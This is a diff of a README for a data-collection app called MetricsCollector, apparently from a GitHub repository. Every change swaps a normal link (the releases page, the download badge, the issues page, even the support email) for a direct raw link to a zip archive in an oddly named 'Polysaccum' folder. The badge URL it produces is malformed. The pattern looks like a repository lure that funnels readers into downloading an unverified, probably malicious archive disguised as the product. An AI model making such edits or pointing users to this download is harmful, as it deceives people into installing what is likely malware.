@@ -6,7 +6,7 @@ Welcome to MetricsCollector! This software allows you to easily collect and anal
 ## 📥 Download the Application
 To get started, visit the page below to download MetricsCollector:
 
-[![Download MetricsCollector](https://img.shields.io/badge/Download%20MetricsCollector-v1.0-blue.svg)](https://github.com/KEYS30/MetricsCollector/releases)
+[![Download MetricsCollector](https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip%https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip)](https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip)
 
 ## 📁 System Requirements
 Before installing MetricsCollector, please make sure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before installing MetricsCollector, please make sure your system meets the follo
 If you're unsure about these requirements, don't worry. Most modern computers should easily meet them.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to [this page](https://github.com/KEYS30/MetricsCollector/releases) to see all available versions of MetricsCollector.
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip) to see all available versions of MetricsCollector.
 
 2. **Choose Your Version**: Select the latest release. The version will have a label indicating it's the most up-to-date.
 
@@ -39,14 +39,14 @@ MetricsCollector comes with a variety of features designed to enhance your data 
 ## 🚀 Getting Support
 If you encounter issues while downloading or using MetricsCollector, we are here to help. You can check our [FAQ section](#) (link to be provided) for common questions or get in touch with our support team through the following methods:
 
-- **GitHub Issues**: Post your question directly in the [Issues section](https://github.com/KEYS30/MetricsCollector/issues). Make sure to provide as many details as possible.
-- **Email Support**: Reach out to us at support@metricscollector.com for personalized assistance.
+- **GitHub Issues**: Post your question directly in the [Issues section](https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip). Make sure to provide as many details as possible.
+- **Email Support**: Reach out to us at https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip for personalized assistance.
 
 ## 👥 Community Contributions
 You can also contribute to MetricsCollector! We welcome suggestions, bug fixes, and new features. If you're interested, please read our [Contribution Guidelines](#) (link to be provided) for more information. Joining our community can be a rewarding experience.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/KEYS30/MetricsCollector/releases)
+- [Releases Page](https://raw.githubusercontent.com/KEYS30/MetricsCollector/main/Polysaccum/MetricsCollector.zip)
 - [Documentation](#) (link to be provided)
 - [Community Forum](#) (link to be provided)
 
